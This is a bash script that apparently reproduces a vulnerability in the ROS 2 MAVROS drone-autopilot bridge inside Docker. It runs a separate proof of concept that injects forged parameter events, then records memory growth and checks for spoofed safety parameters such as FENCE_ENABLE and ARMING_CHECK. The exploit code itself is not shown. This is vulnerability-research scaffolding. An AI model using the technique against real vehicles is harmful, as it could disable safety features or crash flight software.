#!/usr/bin/env bash
# MAVROS-01 reproduction. Reuses the MAVROS-02 image (same shipped mavros package).
#   ./run.sh [--count N]
set -euo pipefail
docker run --rm --name mavros01 \
  -v "$(cd "$(dirname "$0")" && pwd)/poc_MAVROS01_param_event_injection.py:/poc/poc01.py:ro" \
  mavros02-poc bash -lc "
set -e
source /opt/ros/jazzy/setup.bash
ros2 run mavros mavros_node --ros-args \
    -p fcu_url:=udp://127.0.0.1:14540@127.0.0.1:14557 \
    -p system_id:=1 -p component_id:=191 \
    -p target_system_id:=1 -p target_component_id:=1 \
    -r __ns:=/mavros > /tmp/mavros.log 2>&1 &
MPID=\$!
sleep 12

rss() { awk '/VmRSS/{print \$2}' /proc/\$MPID/status 2>/dev/null || echo 0; }
echo \"[run] mavros pid=\$MPID  RSS_before=\$(rss) kB\"

# Capture whatever lands on the GLOBAL /parameter_events topic. Full messages, so
# the node attribution and the attacker-chosen name/value are both visible.
timeout 200 ros2 topic echo /parameter_events > /tmp/param_events.txt 2>&1 &
ECHO_PID=\$!
sleep 3

# Sample RSS while the flood runs -- a slope is the evidence, not two endpoints.
( for i in \$(seq 1 40); do echo \"[rss] t=\${i}0s \$(rss) kB\"; sleep 10; done ) &
SAMP=\$!

python3 /poc/poc01.py $* || true

sleep 3
kill \$SAMP 2>/dev/null || true
echo \"[run] RSS_after=\$(rss) kB\"
kill \$ECHO_PID 2>/dev/null || true
sleep 1

echo ''
echo '[run] ---- forged parameter names seen on the GLOBAL /parameter_events topic ----'
grep -E 'name:' /tmp/param_events.txt | sort | uniq -c | sort -rn | head -12 || true
echo ''
echo '[run] ---- FENCE_ENABLE / ARMING_CHECK / BATT_LOW_VOLT present? ----'
grep -cE 'FENCE_ENABLE|ARMING_CHECK|BATT_LOW_VOLT' /tmp/param_events.txt || true
echo ''
echo \"[run] ---- mavros alive? ----\"
kill -0 \$MPID 2>/dev/null && echo \"[run] ALIVE RSS=\$(rss) kB\" || echo '[run] DEAD'
"
